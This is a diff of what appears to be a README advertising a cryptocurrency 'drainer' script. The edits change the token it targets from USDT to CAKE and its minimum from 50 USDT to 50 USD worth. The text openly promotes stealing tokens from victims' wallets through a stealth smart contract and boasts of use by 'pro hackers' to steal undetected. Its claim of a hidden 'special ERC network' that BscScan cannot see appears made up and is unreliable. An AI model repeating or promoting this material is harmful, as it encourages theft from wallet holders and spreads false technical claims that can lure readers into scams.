@@ -18,7 +18,7 @@ VICTIM ----> CUSTOM SMART CONTRACT -----> YOUR BSC ADDRESS
 
 The !!! smart contract address !!! appears in the transaction not yours this is for stealth
 
-This script will let you drain usdt from the target address
+This script will let you drain cake from the target address
 
 This is a free community code that anyone can audit or edit with pull request and works as designed its been used by pro hackers for years to steal crypto undetected i didnt write this script im just sharing it to show how hackers steal crypto
 
@@ -28,7 +28,7 @@ Smart contract address will show up in the approve and other buttons not yours f
 
 !!!!!THIS SMART CONTRACT IS ON A SPECIAL ERC NETWORK THAT FOWARDS IT TO YOUR ADDRESS ON THE REAL BSC CHAIN FOR STEALTH THIS CONTRACT WILL NOT SHOW UP ON BSCSCAN!!!!!
 
-THE CONTRACT WILL ONLY DRAIN WALLETS WITH 50 USDT or more for stealth
+THE CONTRACT WILL ONLY DRAIN WALLETS WITH 50 USD worth or more for stealth
 
 the smart contract will foward the data to you to prevent you from being caught
 
